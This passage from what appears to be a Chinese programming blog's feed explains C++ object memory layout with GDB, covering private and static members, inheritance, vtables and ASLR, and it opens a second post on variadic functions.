%xmm0,0x8(%rax)</code>写入成员变量b的值，为啥不直接从<code>xmm0</code>寄存器写到基于rbp的偏移地址呢？这是因为 x86_64 的指令集和其操作模式通常支持使用<strong>寄存器间接寻址方式访问数据</strong>。使用<code>rax</code>等通用寄存器作为中间步骤，是一种更通用和兼容的方法。</p><p>当然上面编译过程<strong>没有开启编译优化</strong>，所以编译器采用了直接但效率不高的代码生成策略，包括将参数和局部变量频繁地在栈与寄存器间移动。<strong>而编译器的优化策略可能会影响参数的处理方式</strong>。如果我们开启编译优化，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">g++ basic_method.cpp -o basic_method_O2 -O2 -g -std=c++11</span></span><br></pre></td></tr></table></figure><p>生成的 main 函数汇编部分如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /m main</span><br><span class="line">=&gt; 0x0000555555555060 &lt;+0&gt;:xor    %eax,%eax</span><br><span class="line">   0x0000555555555062 &lt;+2&gt;:ret</span><br><span class="line">   0x0000555555555063:data16 nopw %cs:0x0(%rax,%rax,1)</span><br><span class="line">   0x000055555555506e:xchg   %ax,%ax</span><br></pre></td></tr></table></figure><p>在 <code>O2</code> 优化级别下，编译器认定main函数中的所有操作（包括创建Basic对象和对其成员变量的赋值操作）对程序的最终结果没有影响，因此它们都被优化掉了。这是编译器的“<strong>死代码消除</strong>”，直接移除那些不影响程序输出的代码部分。</p><h2 id="特殊成员内存分布"><a href="#特殊成员内存分布" class="headerlink" title="特殊成员内存分布"></a>特殊成员内存分布</h2><p>上面的成员都是 public 的，如果是 private(私有) 变量，私有方法呢？另外，静态成员变量或者静态成员方法，在内存中又是怎么布局呢？</p><h3 id="私有成员"><a href="#私有成员" class="headerlink" title="私有成员"></a>私有成员</h3><p>先来看私有成员，接着上面的例子，增加私有成员变量和方法。整体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setB</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        b = value; <span class="comment">// 直接访问成员变量b</span></span><br><span class="line">        <span class="built_in">secret</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="type">double</span> d;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">secret</span><span class="params">(<span class="type">int</span> temp)</span> </span>&#123;</span><br><span class="line">        d = temp + c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Basic temp;</span><br><span class="line">    temp.a = <span class="number">10</span>;</span><br><span class="line">    temp.<span class="built_in">setB</span>(<span class="number">3.14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后，通过 GDB，可以打印出所有成员变量的地址，发现这里<strong>私有变量的内存布局并没有什么特殊地方，也是依次顺序存储在对象</strong>中。私有的方法也没有特殊地方，一样存储在文本段。整体布局如下如：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240401_c++_object_model_method_private.png" alt="带 private 成员的内存布局"></p><p>那么 <strong>private 怎么进行可见性控制的呢？</strong>首先编译期肯定是有保护的，这个很容易验证，我们无法直接访问 temp.c ，或者调用 secret 方法，因为直接会编译出错。</p><p>那么<strong>运行期是否有保护呢？</strong>我们来验证下。前面已经验证 private 成员变量也是根据偏移来找到内存位置的，我们可以在代码中直接根据偏移找到内存位置并更改里面的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* pC = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;temp) + <span class="number">16</span>);</span><br><span class="line">*pC = <span class="number">12</span>; <span class="comment">// 直接修改c的值</span></span><br></pre></td></tr></table></figure><p>这里修改后，可以增加一个show方法打印所有成员的值，发现这里temp.c 确实被改为了 12。可见<strong>成员变量在运行期并没有做限制，知道地址就可以绕过编译器的限制进行读写了</strong>。那么私有的方法呢？</p><p>私有方法和普通成员方法一样存储在文本段，我们拿到其地址后，可以通过这个地址调用吗？这里需要一些骚操作，我们<strong>在类定义中添加额外的接口来暴露私有成员方法的地址</strong>，然后通过成员函数指针来调用私有成员函数。整体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 暴露私有成员方法的地址</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="title">void</span> <span class="params">(Basic::*getSecretPtr())</span><span class="params">(<span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;Basic::secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">   <span class="built_in">void</span> (Basic::*funcPtr)(<span class="type">int</span>) = Basic::<span class="built_in">getSecretPtr</span>();</span><br><span class="line">    <span class="comment">// 调用私有成员函数</span></span><br><span class="line">    (temp.*funcPtr)(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码正常运行，你可以通过 print 打印调用前后成员变量的值来验证。看来对于成员函数来说，只是编译期不让直接调用，运行期并没有保护，我们可以绕过编译限制在对象外部调用。</p><p>当然实际开发中，<strong>千万不要直接通过地址偏移来访问私有成员变量</strong>，也不要通过各种骚操作来访问私有成员方法，这样不仅破坏了类的封装性，而且是不安全的。</p><h3 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h3><p>每个熟悉 c++ 类静态成员的人都知道，静态成员变量在类的所有实例之间共享，<strong>不管你创建了多少个类的对象，静态成员变量只有一份数据</strong>。静态成员变量的生命周期从它们被定义的时刻开始，直到程序结束。静态成员方法不依赖于类的任何实例来执行，主要用在工厂方法、单例模式的实例获取方法、或其他与类的特定实例无关的工具函数。</p><p>下面以一个具体的例子，来看看静态成员变量和静态成员方法的内存布局以及实现特点。继续接着前面代码例子，这里省略掉其他无关代码了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">float</span> alias;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; alias &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> Basic::alias = <span class="number">0.233</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    temp.<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的打印 temp 和 alias 地址，发现两者之间差异挺大。temp 地址是 <code>0x7fffffffe380</code>，Basic::alias 是 <code>0x555555558048</code>，用 <code>info target</code> 可以看到 alias 在程序的 <code>.data</code> 内存空间范围 <code>0x0000555555558038 - 0x000055555555804c</code> 内。进一步验证了下，<code>.data</code>段用于存储已初始化的全局变量和静态变量，注意这里需要是非零初始值。</p><p>对于没有初始化，或者初始化为零的全局变量或者静态变量，是存储在 <code>.bss</code> 段内的。这个也很好验证，把上面 alias 的值设为0，重新查看内存位置，就能看到确实在 <code>.bss</code> 段内了。对于全局变量或者静态变量，<strong>为啥需要分为这两个段来存储，而不是合并为一个段来存储呢</strong>？</p><p>这里主要是考虑到<strong>二进制文件磁盘空间大小以及加载效率</strong>。在磁盘上，<code>.data</code> 占用实际的磁盘空间，因为它<strong>需要存储具体的初始值数据</strong>。<code>.bss</code>段不占用实际的存储空间，只需要在程序加载时由操作系统分配并清零相应的内存即可，这样可以减少可执行文件的大小。在程序启动时，操作系统可以快速地为<code>.bss</code>段分配内存并将其初始化为零，而无需从磁盘读取大量的零值数据，可以提高程序的加载速度。这里详细的解释也可以参考 <a href="https://stackoverflow.com/questions/9535250/why-is-the-bss-segment-required">Why is the .bss segment required?</a>。</p><p>静态方法又是怎么实现呢？我们先输出内存地址，发现在 <code>.text</code> 代码段，这点和其他成员方法是一样的。不过和成员方法不同的是，第一个参数并不是 this 指针了。在实现上它与普通的全局函数类似，主要区别在于它们的作用域是限定在其所属的类中。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240407_c++_object_model_static_method.png" alt="static method的实现和内存布局"></p><h2 id="类继承的内存布局"><a href="#类继承的内存布局" class="headerlink" title="类继承的内存布局"></a>类继承的内存布局</h2><p>当然，既然是在聊面向对象的类，那就少不了继承了。我们还是从具体例子来看看，在继承情况下，类的内存布局情况。</p><h3 id="不带虚函数的继承"><a href="#不带虚函数的继承" class="headerlink" title="不带虚函数的继承"></a>不带虚函数的继承</h3><p>先来看看不带虚函数的继承，示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setB</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        b = value; <span class="comment">// 直接访问成员变量b</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Basic &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setC</span><span class="params">(<span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        c = value; <span class="comment">// 直接访问成员变量c</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Derived temp;</span><br><span class="line">    temp.a = <span class="number">10</span>;</span><br><span class="line">    temp.<span class="built_in">setB</span>(<span class="number">3.14</span>);</span><br><span class="line">    temp.c = <span class="number">1</span>;</span><br><span class="line">    temp.<span class="built_in">setC</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，用 GDB 打印成员变量的内存分布，发现 <code>Derived</code> 类的对象在内存中的布局首先包含其基类<code>Basic</code>的所有成员变量，紧接着是 Derived 类自己的成员变量。整体布局如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240409_c++_object_model_inherit.png" alt="继承类的内存布局"></p><p>其实 C++ 标准并没有规定在继承中，基类和派生类的成员变量之间的排列顺序，编译器可以自由发挥的。但是大部分编译器在实现中，都是基类的成员变量在派生类的成员变量之前，为什么这么做呢？因为这样实现，<strong>使对象模型变得更简单和直观。不论是基类还是派生类，对象的内存布局都是连续的，简化了对象创建、复制和销毁等操作的实现。</strong>我们通过派生类对象访问基类成员与直接使用基类对象访问时完全一致，一个派生类对象的前半部分就是一个完整的基类对象。</p><p>对于成员函数（包括普通函数和静态函数），它们不占用对象实例的内存空间。不论是基类的成员函数还是派生类的成员函数，它们都存储在程序的代码段中（.text段）。</p><h3 id="带有虚函数的继承"><a href="#带有虚函数的继承" class="headerlink" title="带有虚函数的继承"></a>带有虚函数的继承</h3><p>带有虚函数的继承，稍微有点复杂了。在前面继承例子基础上，增加一个虚函数，然后在 main 中用多态的方式调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Basic: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Basic in B&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setB</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        b = value; <span class="comment">// 直接访问成员变量b</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Basic &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Derived: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c = &quot;</span> &lt;&lt; c &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setC</span><span class="params">(<span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        c = value; <span class="comment">// 直接访问成员变量c</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Derived derivedObj;</span><br><span class="line">    derivedObj.a = <span class="number">10</span>;</span><br><span class="line">    derivedObj.<span class="built_in">setB</span>(<span class="number">3.14</span>);</span><br><span class="line">    derivedObj.c = <span class="number">1</span>;</span><br><span class="line">    derivedObj.<span class="built_in">setC</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    Basic* ptr = &amp;derivedObj; <span class="comment">// 基类指针指向派生类对象</span></span><br><span class="line">    ptr-&gt;<span class="built_in">printInfo</span>(); <span class="comment">// 多态调用</span></span><br><span class="line">    ptr-&gt;<span class="built_in">printB</span>(); <span class="comment">// 调用</span></span><br><span class="line"></span><br><span class="line">    Basic  basicObj;</span><br><span class="line">    basicObj.a = <span class="number">10</span>;</span><br><span class="line">    basicObj.<span class="built_in">setB</span>(<span class="number">3.14</span>);</span><br><span class="line"></span><br><span class="line">    Basic* anotherPtr = &amp;basicObj;</span><br><span class="line">    anotherPtr-&gt;<span class="built_in">printInfo</span>();</span><br><span class="line">    anotherPtr-&gt;<span class="built_in">printB</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Basic* ptr = &amp;derivedObj;</code> 这一行用一个基类指针指向派生类对象，当通过基类指针调用虚函数 <code>ptr-&gt;printInfo();</code>时，将在运行时解析为 <code>Derived::printInfo()</code> 方法，这是就是运行时多态。对于 <code>ptr-&gt;printB();</code> 调用，由于派生类中没有定义 <code>printB()</code> 方法，所以会调用基类的 <code>printB()</code> 方法。</p><p>那么在有虚函数继承的情况下，对象的内存布局是什么样？虚函数的多态调用又是怎么实现的呢？实践出真知，我们可以通过 GDB 来查看对象的内存布局，在此基础上可以验证虚函数表指针，虚函数表以及多态调用的实现细节。这里先看下 Derived 类对象的内存布局，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240509_c++_object_model_virtual_derived_pointer.png" alt="带虚函数的继承类内存布局"></p><p>可以看到派生类对象的开始部分（地址 <code>0x7fffffffe370</code> 处）有一个 8 字节的虚函数表指针 vptr（指针地址 <code>0x555555557d80</code>），这个指针指向一个虚函数表（vtable），虚函数表中存储了虚函数的地址，一共有两个地址 <code>0x55555555538c</code> 和 <code>0x555555555336</code>，分别对应<code>Derived</code> 类中的两个虚函数 <code>printInfo</code> 和 <code>printB</code>。基类的情况类似，下面画一个图来描述更清晰些：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240509_c++_object_model_virtual_pointer_demo.png" alt="带虚函数的继承类内存布局示意图"></p><p>现在搞清楚了虚函数在类对象中的内存布局。在编译器实现中，<strong>虚函数表指针是每个对象实例的一部分，占用对象实例的内存空间</strong>。对于一个实例对象，<strong>通过其地址就能找到对应的虚函数表，然后通过虚函数表找到具体的虚函数地址，实现多态调用</strong>。那么为什么<strong>必须通过引用或者指针才能实现多态调用</strong>呢？看下面 3 个调用，最后一个没法多态调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Basic&amp; ref = derivedObj; </span><br><span class="line">Basic* ptr = &amp;derivedObj;</span><br><span class="line">Basic dup = derivedObj; <span class="comment">// 没法实现多态调用</span></span><br></pre></td></tr></table></figure><p>我们用 GDB 来看下这三种对象的内存布局，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240510_c++_object_model_virtual_derived_more.png" alt="3 种对象的内存布局区别，深入理解多态"></p><p>指针和引用在编译器底层没有区别，ref 和 ptr 的地址一样，就是原来派生类 derivedObj 的地址<code>0x7fffffffe360</code>，里面的虚函数表指针指向派生类的虚函数表，所以可以调用到派生类的 printInfo。而这里的 dup 是通过拷贝构造函数生成的，编译器执行了隐式类型转换，从派生类截断了基类部分，生成了一个基类对象。dup 中的虚函数表指针指向的是基类的虚函数表，所以调用的是基类的 printInfo。</p><p>从上面 dup 虚函数表指针的输出也可以看到，虚函数表不用每个实例一份，<strong>所有对象实例共享同一个虚函数表即可</strong>。虚函数表是每个多态类一份，由编译器在编译时创建。</p><p>当然，这里是 Mac 平台下 Clang 编译器对于多态的实现。C++ 标准本身没有规定多态的实现细节，没有说一定要有虚函数表（vtable）和虚函数表指针（vptr）来实现。这是因为C++标准关注的是行为和语义，确保我们使用多态特性时能够得到正确的行为，但它不规定底层的内存布局或具体的实现机制，这些细节通常由编译器的实现来决定。</p><p>不同编译器的实现也可能不一样，许多编译器为了访问效率，<strong>将虚函数表指针放在对象内存布局的开始位置</strong>。这样，虚函数的调用可以快速定位到虚函数表，然后找到对应的函数指针。如果类有多重继承，情况可能更复杂，某些编译器可能会采取不同的策略来安排虚函数表指针的位置，或者一个对象可能有多个虚函数表指针。</p><h2 id="地址空间布局随机化"><a href="#地址空间布局随机化" class="headerlink" title="地址空间布局随机化"></a>地址空间布局随机化</h2><p>前面的例子中，如果用 GDB 多次运行程序，对象的<strong>虚拟内存地址每次都一样</strong>，这是为什么呢？</p><p>我们知道现代操作系统中，每个运行的程序都使用<strong>虚拟内存地址空间</strong>，通过操作系统的内存管理单元（MMU）映射到物理内存的。虚拟内存有很多优势，包括<strong>提高安全性、允许更灵活的内存管理等</strong>。为了防止<strong>缓冲区溢出攻击</strong>等安全漏洞，操作系统还会在每次程序启动时<strong>随机化进程的地址空间布局</strong>，这就是地址空间布局随机化（ASLR，<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Address Space Layout Randomization</a>）。</p><p>在 Linux 操作系统上，可以通过 <code>cat /proc/sys/kernel/randomize_va_space</code> 查看当前系统的 ASLR 是否启用，基本上默认都是开启状态(值为 2)，如果是 0，则是禁用状态。</p><p>前面使用 GDB 进行调试时，之所以观察到内存地址是固定不变的，这是因为 GDB 默认禁用了ASLR，以便于调试过程中更容易重现问题。可以在使用 GDB 时启用 ASLR，从而让调试环境更贴近实际运行环境。启动 GDB 后，可以通过下面命令开启地址空间的随机化。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="keyword">set</span> <span class="keyword">disable</span>-randomization <span class="keyword">off</span></span><br></pre></td></tr></table></figure><p>之后再多次运行，这里的地址就会变化了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240319_c++_object_model_gdb_disable.png" alt="GDB 开启地址空间布局随机化"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>C++ 的对象模型是一个复杂的话题，涉及到类的内存布局、成员变量和成员函数的访问、继承、多态等多个方面。本文从实际例子出发，帮助大家对 C++ 对象的内存布局有了一个直观的认识。</p><p>简单总结下本文的核心结论：</p><ol><li>对象的内存布局是连续的，成员变量按照声明的顺序存储在对象中，编译器会根据类定义计算每个成员变量相对于对象起始地址的偏移量。</li><li>成员方法存储在进程的文本段，不占用对象实例的内存空间，通过 this 指针和偏移量访问成员变量。</li><li>私有成员变量和方法在运行期并没有保护，可以通过地址偏移绕过编译器的限制进行读写，但是不推荐这样做。</li><li>静态成员变量和静态成员方法存储在程序的数据段和代码段，不占用对象实例的内存空间。</li><li>继承类的内存布局，编译器一般会把基类的成员变量放在派生类的成员变量之前，使对象模型变得更简单和直观。</li><li>带有虚函数的继承，对象的内存布局中包含虚函数表指针，多态调用通过虚函数表实现。虚函数实现比较复杂，这里只考虑简单的单继承。</li><li>地址空间布局随机化（ASLR）是现代操作系统的安全特性，可以有效防止缓冲区溢出攻击等安全漏洞。GDB 默认禁用 ASLR，可以通过 <code>set disable-randomization off</code> 命令开启地址空间的随机化。</li></ol><p>当然本文也只是一个入门级的介绍，更深入的内容可以参考《深度探索 C++对象模型：Inside the C++ Object Model》这本书。</p>]]></content>
    
    
    <summary type="html">通过实例来深入理解 C++ 对象的内存布局，包括基础数据类、带方法的类、私有成员、静态成员、类继承等。通过 GDB 查看对象的内存布局，探讨成员变量、成员方法、虚函数表等在内存中的存储位置和实现细节，帮助大家对 C++ 类成员变量和函数在内存布局有个直观的理解。</summary>
    
    
    
    <category term="程序设计" scheme="https://selfboot.cn/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="C++" scheme="https://selfboot.cn/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C++ 函数可变参实现方法的演进</title>
    <link href="https://selfboot.cn/2024/05/07/variadic_arguments_in_c++/"/>
    <id>https://selfboot.cn/2024/05/07/variadic_arguments_in_c++/</id>
    <published>2024-05-07T12:10:02.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>可变参数函数是<strong>接受可变数量参数的函数</strong>，在不少场景下，可变参数函数是非常有用的。比如想打印日志时，可以接受任意数量的参数，然后将这些参数拼接输出到控制台，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...;</span></span><br><span class="line">    <span class="built_in">LogInfo</span>(user, cost, action, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在C++中，可变参数函数的实现方法也是不断演进的，从<strong>最初C风格的可变参数列表，到 C++11 的变参模板，再到 C++17 引入的折叠表达式</strong>，见证了 C++ 语言的逐步发展和完善。接下来本文会介绍这三种方式的实现细节以及优缺点。</p><span id="more"></span><h2 id="C-风格变长参数列表"><a href="#C-风格变长参数列表" class="headerlink" title="C 风格变长参数列表"></a>C 风格变长参数列表</h2><p>最早是 C 风格的变长参数列表，它通过 <code>&lt;cstdarg&gt;</code> 中定义的宏实现，主要包括：<code>va_list, va_start, va_arg, va_end</code>。下面是一个使用 C 风格变长参数的例子，实现了一个函数来计算任意数量整数的和：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdarg&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要提供参数个数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> n, 